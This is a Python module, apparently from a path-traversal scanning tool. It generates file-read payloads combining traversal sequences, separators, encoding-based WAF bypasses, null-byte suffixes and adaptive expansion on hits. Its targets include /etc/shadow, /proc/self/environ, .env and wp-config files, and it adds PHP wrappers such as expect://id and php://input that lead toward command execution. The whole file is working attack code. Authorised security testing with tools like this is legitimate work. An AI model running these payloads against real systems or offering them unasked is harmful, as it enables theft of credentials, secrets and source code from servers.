"""Combinatorial payload generator.

Replaces v2 static wordlists with a generator that dynamically
combines:  depth × traversal_variant × separator × encoding × target_file × suffix.

Every yielded payload carries a ``PayloadMeta`` so the adaptive engine
knows which axis to expand when a hit occurs.
"""

from __future__ import annotations

import urllib.parse
from typing import Dict, Generator, List, Optional, Set, Tuple

from pathprobe.core.types import PayloadMeta
from pathprobe.core.config import TARGET_FILES
from pathprobe.modules.waf_bypass import ENCODERS, apply_encoding


# Type alias for readability
PayloadItem = Tuple[str, PayloadMeta]


class PayloadEngine:
    """Generate path-traversal payloads dynamically.

    Usage::

        engine = PayloadEngine()
        for payload_str, meta in engine.generate(os_hint="linux",
                                                  phase="discovery"):
            ...
    """

    # ── Traversal sequences ──────────────────────────────────────────
    # Each key is a traversal *variant* — the value is the ``..``
    # equivalent before a separator is appended.
    TRAVERSAL_VARIANTS: Dict[str, str] = {
        "standard":   "..",
        "nested":     "....",       # after filter strips ../ once → ../
        "dot_slash":  "./..",
        "backtrack":  "..././..",
        "semicolon":  "..;",        # Tomcat/Jetty path-parameter trick
    }

    # ── Separator variants ───────────────────────────────────────────
    SEPARATORS: Dict[str, str] = {
        "fwd":         "/",
        "back":        "\\",
        "mixed_fb":    "\\/",
        "mixed_bf":    "/\\",
        "double_fwd":  "//",
    }

    # ── Suffix tricks ────────────────────────────────────────────────
    SUFFIXES: Dict[str, str] = {
        "none":       "",
        "null":       "%00",
        "null_png":   "%00.png",
        "null_jpg":   "%00.jpg",
        "null_php":   "%00.php",
        "null_txt":   "%00.txt",
        "dot_slash":  "/.",
        "hash":       "%23",
    }

    # ── PHP wrappers (read-only — safe for core) ────────────────────
    PHP_WRAPPERS: List[Tuple[str, str]] = [
        ("php://filter/convert.base64-encode/resource=index",            "php_filter_b64"),
        ("php://filter/convert.base64-encode/resource=../config",        "php_filter_b64"),
        ("php://filter/convert.base64-encode/resource=../../.env",       "php_filter_b64"),
        ("php://filter/read=string.rot13/resource=index",                "php_filter_rot13"),
        ("php://filter/convert.base64-encode/resource=../wp-config",     "php_filter_b64"),
        ("php://filter/convert.base64-encode/resource=../../config.php", "php_filter_b64"),
    ]

    # Aggressive wrappers — gated behind --aggressive
    PHP_WRAPPERS_AGGRESSIVE: List[Tuple[str, str]] = [
        ("php://input",                                                   "php_input"),
        ("data://text/plain;base64,UEFUSFBST0JFX0NBTkFSWQ==",            "data_wrapper"),
        ("expect://id",                                                   "expect_wrapper"),
    ]

    # ── Absolute paths (no traversal needed) ─────────────────────────
    ABSOLUTE_LINUX = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/proc/self/environ", "/proc/version",
    ]
    ABSOLUTE_WINDOWS = [
        "C:\\windows\\win.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
        "C:\\inetpub\\wwwroot\\web.config",
        "\\\\localhost\\c$\\windows\\win.ini",
    ]

    # ── Discovery-phase parameters ───────────────────────────────────
    _DISC_DEPTHS     = (3, 5, 7)
    _DISC_ENCODINGS  = ("none", "url", "double_url")
    _DISC_SEPS       = ("fwd", "back")
    _DISC_SUFFIXES   = ("none",)
    _DISC_TRAVERSALS = ("standard", "nested")
    _DISC_MAX_TARGETS = 5   # per OS category

    # ── Exploitation-phase parameters ────────────────────────────────
    _EXPLOIT_DEPTHS = range(1, 11)

    def generate(
        self,
        os_hint: Optional[str] = None,
        phase: str = "discovery",
        aggressive: bool = False,
    ) -> Generator[PayloadItem, None, None]:
        """Main entry point.  Yields ``(payload_string, PayloadMeta)``."""
        if phase == "discovery":
            yield from self._discovery(os_hint)
        else:
            yield from self._exploitation(os_hint, aggressive)

    # ────────────────────────────────────────────────────────────────
    #  Phase 1: Discovery  (~80-150 payloads)
    # ────────────────────────────────────────────────────────────────

    def _discovery(self, os_hint: Optional[str]) -> Generator[PayloadItem, None, None]:
        targets = self._select_targets(os_hint, self._DISC_MAX_TARGETS)
        seen: Set[str] = set()

        # Combinatorial traversal payloads (light)
        for depth in self._DISC_DEPTHS:
            for tv_name in self._DISC_TRAVERSALS:
                tv = self.TRAVERSAL_VARIANTS[tv_name]
                for sep_name in self._DISC_SEPS:
                    sep = self.SEPARATORS[sep_name]
                    for enc_name in self._DISC_ENCODINGS:
                        for target in targets:
                            raw = (tv + sep) * depth + target.lstrip("/")
                            payload = apply_encoding(raw, enc_name)
                            if payload in seen:
                                continue
                            seen.add(payload)
                            yield payload, PayloadMeta(
                                encoding=enc_name, depth=depth,
                                target_file=target, technique=tv_name,
                                phase="discovery", separator=sep_name,
                                category="traversal",
                            )

        # Absolute paths (no encoding needed)
        for p in self._absolute_paths(os_hint):
            if p not in seen:
                seen.add(p)
                yield p, PayloadMeta(
                    technique="absolute", phase="discovery",
                    target_file=p, category="absolute",
                )

        # Webapp config files (shallow traversal)
        for target in TARGET_FILES["webapp"][:8]:
            for depth in (1, 2, 3):
                raw = "../" * depth + target.lstrip("/")
                if raw not in seen:
                    seen.add(raw)
                    yield raw, PayloadMeta(
                        depth=depth, target_file=target,
                        phase="discovery", category="webapp_config",
                    )

        # PHP wrappers (always in discovery for PHP targets)
        for wrapper, technique in self.PHP_WRAPPERS:
            if wrapper not in seen:
                seen.add(wrapper)
                yield wrapper, PayloadMeta(
                    technique=technique, phase="discovery",
                    category="php_wrapper", target_file=wrapper,
                )

    # ────────────────────────────────────────────────────────────────
    #  Phase 2: Exploitation  (deep, combinatorial)
    # ────────────────────────────────────────────────────────────────

    def _exploitation(
        self, os_hint: Optional[str], aggressive: bool,
    ) -> Generator[PayloadItem, None, None]:
        targets = self._select_targets(os_hint, max_per_cat=None)
        seen: Set[str] = set()

        # Full combinatorial: traversal × separator × depth × encoding × target × suffix
        for depth in self._EXPLOIT_DEPTHS:
            for tv_name, tv in self.TRAVERSAL_VARIANTS.items():
                for sep_name, sep in self.SEPARATORS.items():
                    for enc_name in ENCODERS:
                        for target in targets:
                            for sfx_name, sfx in self.SUFFIXES.items():
                                raw = (tv + sep) * depth + target.lstrip("/")
                                payload = apply_encoding(raw, enc_name) + sfx
                                if payload in seen:
                                    continue
                                seen.add(payload)
                                yield payload, PayloadMeta(
                                    encoding=enc_name, depth=depth,
                                    target_file=target, technique=tv_name,
                                    phase="exploitation", separator=sep_name,
                                    suffix=sfx_name, category="traversal",
                                )

        # Absolute paths with encoding variants
        for p in self._absolute_paths(os_hint):
            for enc_name in ENCODERS:
                encoded = apply_encoding(p, enc_name)
                if encoded not in seen:
                    seen.add(encoded)
                    yield encoded, PayloadMeta(
                        encoding=enc_name, technique="absolute",
                        phase="exploitation", target_file=p,
                        category="absolute",
                    )

        # All webapp configs with full depth range
        for target in TARGET_FILES["webapp"]:
            for depth in range(1, 8):
                for enc_name in ("none", "url", "double_url"):
                    raw = "../" * depth + target.lstrip("/")
                    payload = apply_encoding(raw, enc_name)
                    if payload not in seen:
                        seen.add(payload)
                        yield payload, PayloadMeta(
                            encoding=enc_name, depth=depth,
                            target_file=target, phase="exploitation",
                            category="webapp_config",
                        )

        # PHP wrappers
        for wrapper, technique in self.PHP_WRAPPERS:
            if wrapper not in seen:
                seen.add(wrapper)
                yield wrapper, PayloadMeta(
                    technique=technique, phase="exploitation",
                    category="php_wrapper", target_file=wrapper,
                )

        if aggressive:
            for wrapper, technique in self.PHP_WRAPPERS_AGGRESSIVE:
                if wrapper not in seen:
                    seen.add(wrapper)
                    yield wrapper, PayloadMeta(
                        technique=technique, phase="exploitation",
                        category="php_wrapper_aggressive",
                        target_file=wrapper,
                    )

    # ────────────────────────────────────────────────────────────────
    #  Adaptive expansion
    # ────────────────────────────────────────────────────────────────

    def expand_on_hit(
        self,
        hit_meta: PayloadMeta,
        os_hint: Optional[str] = None,
    ) -> Generator[PayloadItem, None, None]:
        """Given a successful payload's metadata, generate *more* payloads
        along the axes that contributed to the hit.

        Called by the scan engine when a discovery payload fires.
        """
        # If encoding helped, try all other encodings at same depth+target
        if hit_meta.encoding != "none":
            for enc_name in ENCODERS:
                if enc_name == hit_meta.encoding:
                    continue
                raw = (self.TRAVERSAL_VARIANTS.get(hit_meta.technique, "..") +
                       self.SEPARATORS.get(hit_meta.separator, "/")) * hit_meta.depth
                raw += hit_meta.target_file.lstrip("/")
                yield apply_encoding(raw, enc_name), PayloadMeta(
                    encoding=enc_name, depth=hit_meta.depth,
                    target_file=hit_meta.target_file,
                    technique=hit_meta.technique,
                    phase="adaptive", separator=hit_meta.separator,
                    category="adaptive_encoding",
                )

        # If depth > 1, find minimum working depth
        if hit_meta.depth > 1:
            for d in range(1, hit_meta.depth):
                raw = (self.TRAVERSAL_VARIANTS.get(hit_meta.technique, "..") +
                       self.SEPARATORS.get(hit_meta.separator, "/")) * d
                raw += hit_meta.target_file.lstrip("/")
                yield apply_encoding(raw, hit_meta.encoding), PayloadMeta(
                    encoding=hit_meta.encoding, depth=d,
                    target_file=hit_meta.target_file,
                    technique=hit_meta.technique,
                    phase="adaptive", separator=hit_meta.separator,
                    category="adaptive_depth",
                )

        # Try other target files at the same working depth+encoding
        for target in self._select_targets(os_hint, max_per_cat=None):
            if target == hit_meta.target_file:
                continue
            raw = (self.TRAVERSAL_VARIANTS.get(hit_meta.technique, "..") +
                   self.SEPARATORS.get(hit_meta.separator, "/")) * hit_meta.depth
            raw += target.lstrip("/")
            yield apply_encoding(raw, hit_meta.encoding), PayloadMeta(
                encoding=hit_meta.encoding, depth=hit_meta.depth,
                target_file=target, technique=hit_meta.technique,
                phase="adaptive", separator=hit_meta.separator,
                category="adaptive_target",
            )

        # Try all suffix variants at known working combo
        for sfx_name, sfx in self.SUFFIXES.items():
            if sfx_name == "none" or sfx_name == hit_meta.suffix:
                continue
            raw = (self.TRAVERSAL_VARIANTS.get(hit_meta.technique, "..") +
                   self.SEPARATORS.get(hit_meta.separator, "/")) * hit_meta.depth
            raw += hit_meta.target_file.lstrip("/")
            yield apply_encoding(raw, hit_meta.encoding) + sfx, PayloadMeta(
                encoding=hit_meta.encoding, depth=hit_meta.depth,
                target_file=hit_meta.target_file,
                technique=hit_meta.technique, phase="adaptive",
                separator=hit_meta.separator, suffix=sfx_name,
                category="adaptive_suffix",
            )

    # ────────────────────────────────────────────────────────────────
    #  External wordlist
    # ────────────────────────────────────────────────────────────────

    @staticmethod
    def from_wordlist(path: str) -> Generator[PayloadItem, None, None]:
        """Load payloads from an external file (one per line).

        Lines starting with ``#`` and blank lines are skipped.
        Payloads are yielded as-is with no encoding or WAF transforms.
        """
        import os
        if not os.path.isfile(path):
            raise FileNotFoundError(f"Wordlist not found: {path}")

        seen: Set[str] = set()
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                entry = line.rstrip("\r\n")
                if not entry or entry.startswith("#"):
                    continue
                if entry in seen:
                    continue
                seen.add(entry)
                yield entry, PayloadMeta(
                    category="wordlist", phase="external",
                )

    # ────────────────────────────────────────────────────────────────
    #  Helpers
    # ────────────────────────────────────────────────────────────────

    def _select_targets(
        self, os_hint: Optional[str], max_per_cat: Optional[int] = 5,
    ) -> List[str]:
        """Pick target files filtered by detected OS."""
        result: List[str] = []
        cats = []
        if os_hint != "windows":
            cats.append("linux")
        if os_hint != "linux":
            cats.append("windows")
        cats.append("webapp")   # always included

        for cat in cats:
            files = TARGET_FILES.get(cat, [])
            result.extend(files[:max_per_cat] if max_per_cat else files)
        return result

    def _absolute_paths(self, os_hint: Optional[str]) -> List[str]:
        result: List[str] = []
        if os_hint != "windows":
            result.extend(self.ABSOLUTE_LINUX)
        if os_hint != "linux":
            result.extend(self.ABSOLUTE_WINDOWS)
        return result


def deduplicate_payloads(
    payloads: List[PayloadItem],
) -> List[PayloadItem]:
    """Remove payloads that decode to the same canonical path.

    Two payloads ``%2e%2e%2fetc%2fpasswd`` and ``../etc/passwd`` have
    the same canonical form; we keep the *first* (which was generated
    with fewer encoding layers and is more likely to succeed).
    """
    seen: Set[str] = set()
    unique: List[PayloadItem] = []
    for payload_str, meta in payloads:
        canonical = urllib.parse.unquote(urllib.parse.unquote(payload_str))
        canonical = canonical.replace("\\", "/").replace("//", "/")
        if canonical not in seen:
            seen.add(canonical)
            unique.append((payload_str, meta))
    return unique
